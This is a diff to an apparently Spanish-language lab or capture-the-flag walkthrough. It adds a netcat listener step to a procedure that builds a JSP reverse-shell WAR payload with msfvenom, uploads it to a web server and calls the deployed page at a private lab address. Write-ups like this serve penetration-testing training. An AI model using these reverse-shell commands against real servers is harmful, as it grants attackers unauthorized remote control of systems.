@@ -117,6 +117,10 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.18 LPORT=5555 -f war -o r
 ```
 3. Subimos en arhcivo generado a la web 
 
+```bash
+nc -lnvp 5555
+```
+
 Podremos acceder a esta pagina: http://192.168.0.23:8080/revshell/
 
 Y atendríamos una reverse shell
